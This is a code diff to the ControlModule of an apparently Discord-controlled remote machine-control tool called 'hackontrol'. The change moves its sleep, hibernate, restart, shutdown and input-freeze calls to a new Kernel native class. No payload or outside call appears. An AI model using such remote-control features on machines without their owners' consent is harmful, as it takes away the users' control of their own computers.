@@ -11,6 +11,7 @@ import com.khopan.hackontrol.manager.interaction.InteractionManager;
 import com.khopan.hackontrol.manager.interaction.Question;
 import com.khopan.hackontrol.manager.interaction.Question.QuestionType;
 import com.khopan.hackontrol.module.Module;
+import com.khopan.hackontrol.nativelibrary.Kernel;
 import com.khopan.hackontrol.registry.Registry;
 import com.khopan.hackontrol.utils.HackontrolError;
 import com.khopan.hackontrol.utils.HackontrolMessage;
@@ -73,15 +74,19 @@ public class ControlModule extends Module {
 
 	private void buttonPower(ButtonContext context, PowerAction powerAction) {
 		Question.positive(context.reply(), "Are you sure you want to " + powerAction.name().toLowerCase() + '?', QuestionType.YES_NO, () -> {
-			String message = switch(powerAction) {
-			case SLEEP -> NativeLibrary.sleep();
-			case HIBERNATE -> NativeLibrary.hibernate();
-			case RESTART -> NativeLibrary.restart();
-			case SHUTDOWN -> NativeLibrary.shutdown();
-			};
-
-			if(message != null) {
-				HackontrolError.multiline(context.message(), message.trim());
+			switch(powerAction) {
+			case SLEEP:
+				Kernel.sleep();
+				break;
+			case HIBERNATE:
+				Kernel.hibernate();
+				break;
+			case RESTART:
+				Kernel.restart();
+				break;
+			case SHUTDOWN:
+				Kernel.shutdown();
+				break;
 			}
 		});
 	}
@@ -132,7 +137,7 @@ public class ControlModule extends Module {
 
 	private void freeze(boolean freeze) {
 		NativeLibrary.Freeze = freeze;
-		NativeLibrary.freeze(freeze);
+		Kernel.setFreeze(freeze);
 	}
 
 	private boolean voiceConnect(Guild guild, ISendable sender, boolean connect) throws Throwable {
